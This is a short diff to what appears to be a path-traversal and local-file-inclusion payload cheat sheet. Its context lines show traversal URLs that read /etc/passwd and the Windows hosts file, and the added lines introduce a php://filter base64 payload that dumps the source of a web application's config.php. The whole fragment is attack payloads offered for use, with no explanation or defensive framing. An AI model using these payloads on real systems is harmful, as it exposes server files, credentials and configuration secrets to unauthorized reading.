@@ -9,7 +9,9 @@ http://example.com/example.php?=../../../../../etc/passwd     >>>>> modified lin
 Basic Paylaod for Windows >> “..\..\..\..\..\”
 http://example.com/example.php?=..\..\..\..\..\windows\system32\drivers\etc\hosts     >>>>> modified link
 
-
+Reading PHP Files
+-----------------
+https://example.com/index.php?=php://filter/convert.base64-encode/resource=/var/www/html/config.php
 
 
 Paylaods for Bypass
